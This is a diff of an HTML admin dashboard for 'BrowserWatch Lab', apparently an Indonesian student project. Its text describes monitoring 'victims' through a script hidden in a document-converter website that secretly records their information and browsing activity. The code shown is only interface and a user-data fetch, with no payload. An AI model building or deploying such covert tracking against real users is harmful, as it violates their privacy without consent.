@@ -1,61 +1,89 @@
 <!DOCTYPE html>
 <html lang="id">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>BrowserWatch Lab Dashboard</title>
-        <link rel="stylesheet" href="/static/dashboard.css">
-    </head>
-    <body>
-        <div class="container">
-            <!-- Sidebar -->
-            <div class="sidebar">
-                <div class="admin-profile">
-                    <div class="profile-image">
-                        <img src="/static/image/admin-profil.jpg" alt="Admin Profile">
-                    </div>
-                    <h2>Admin</h2>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BrowserWatch Lab Dashboard</title>
+    <link rel="stylesheet" href="/static/dashboard.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="admin-profile">
+                <div class="profile-image">
+                    <img id="profileImage" src="/static/image/admin-profil.jpg" alt="Admin Profile">
                 </div>
-                
-                <nav class="sidebar-nav">
-                    <a href="/templates/dashboard.html" class="nav-item active">Dashboard</a>
-                    <a href="/templates/victim.html" class="nav-item">Victim</a>
-                    <a href="/templates/settings.html" class="nav-item">Settings</a>
-                </nav>
-                
-                <div class="logout-section">
-                    <a href="/logout" class="logout-btn">
-                        <img src="/static/image/logout-icon.png" alt="Logout Icon" class="logout-icon">
-                        Logout
-                    </a>
-                </div>
+                <h2 id="username">Admin</h2> 
             </div>
             
-            <div class="main-content">
-                <div class="content-wrapper">
-                    <section class="introduction">
-                        <div class="section-title">
-                           <span>Introduction</span>
-                           <div class="line"></div>
-                        </div>
-                        <div class="intro-content">
-                            <h2>Selamat Datang di BrowserWatch Lab!</h2>
-                            <p>Website ini adalah website untuk memantau korban dengan script yang berjalan diprangkatnya yang diseteksi secara tidak sengaja (korban tidak mengetahuinya), script disembunyikan pada sebuah website converter, website untuk mengubah jenis sebuah dokumen. lalu saat korban menggunakan web converter tersebut, secara tidak langsung ia sudah menjalani script yang akan merekam informasi dan aktivitasnya di internet.</p>
-                        </div>
-                    </section>
-                    
-                    <section class="members">
-                        <h1>Members</h1>
-                        <div class="members-image">
-                            <img src="https://via.placeholder.com/400x250/2C3E50/FFFFFF?text=Group+Photo" alt="Members Group Photo">
-                        </div>
-                    </section>
-                </div>
-                
-                <div class="logo">
-                    <img src="/static/image/Logo PBL.png" alt="FBL Logo">
-                </div>
+            <nav class="sidebar-nav">
+                <a href="/dashboard" class="nav-item active">Dashboard</a>
+                <a href="/victim" class="nav-item">Victim</a>
+                <a href="/settings" class="nav-item">Settings</a>
+            </nav>
+            
+            <div class="logout-section">
+                <a href="/logout" class="logout-btn">
+                    <img src="/static/image/12.jpg" alt="Logout Icon" class="logout-icon">
+                    Logout
+                </a>
             </div>
         </div>
-    </body>
+        
+        <!-- Button untuk toggle sidebar pada layar kecil -->
+        <div class="menu-btn" onclick="toggleSidebar()">☰</div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="content-wrapper">
+                <section class="introduction">
+                    <div class="section-title">
+                        <span></span>
+                        <div class="line"></div>
+                    </div>
+                    <div class="intro-content">
+                        <h2>Selamat Datang di BrowserWatch Lab!</h2>
+                        <p>Website ini adalah website untuk memantau korban dengan script yang berjalan diprangkatnya yang diseteksi secara tidak sengaja (korban tidak mengetahuinya), script disembunyikan pada sebuah website converter, website untuk mengubah jenis sebuah dokumen. lalu saat korban menggunakan web converter tersebut, secara tidak langsung ia sudah menjalani script yang akan merekam informasi dan aktivitasnya di internet.</p>
+                    </div>
+                </section>
+                
+                <section class="members">
+                    <h1>Anggota</h1>
+                    <div class="members-image">
+                        <img src="/static/image/kelompok.jpeg" alt="Members Group Photo">
+                    </div>
+                </section>
+            </div>
+            
+            <div class="logo">
+                <img src="/static/image/Logo PBL.png" alt="FBL Logo">
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $.ajax({
+                url: '/get_user',  
+                method: 'GET',
+                success: function(data) {
+                    if (data.profile_picture) {
+                        $('#profileImage').attr('src', '/static/uploads/' + data.profile_picture);  
+                    }
+                    $('#username').text(data.username);  
+                },
+                error: function(error) {
+                    console.error('Error fetching user data:', error);
+                }
+            });
+        });
+
+        // Fungsi untuk toggle sidebar pada layar kecil
+        function toggleSidebar() {
+            document.querySelector('.sidebar').classList.toggle('active');
+        }
+    </script>
+</body>
 </html>
